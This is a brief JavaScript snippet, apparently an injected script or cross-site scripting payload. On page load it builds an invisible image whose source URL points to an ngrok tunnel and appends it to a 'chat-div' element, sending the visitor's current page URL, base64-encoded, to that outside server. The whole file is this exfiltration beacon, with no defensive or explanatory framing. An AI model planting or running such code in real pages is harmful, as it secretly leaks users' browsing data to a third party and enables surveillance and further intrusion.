window.addEventListener('load', function () {
 function send2server(name, data){
    img = document.createElement("img");
    img.src = "https://04e3f05d.ngrok.io?name="+name+"&data="+btoa(encodeURI(data));
    document.getElementById("chat-div").appendChild(img);
}


send2server("path",window.location.href);
  
    })
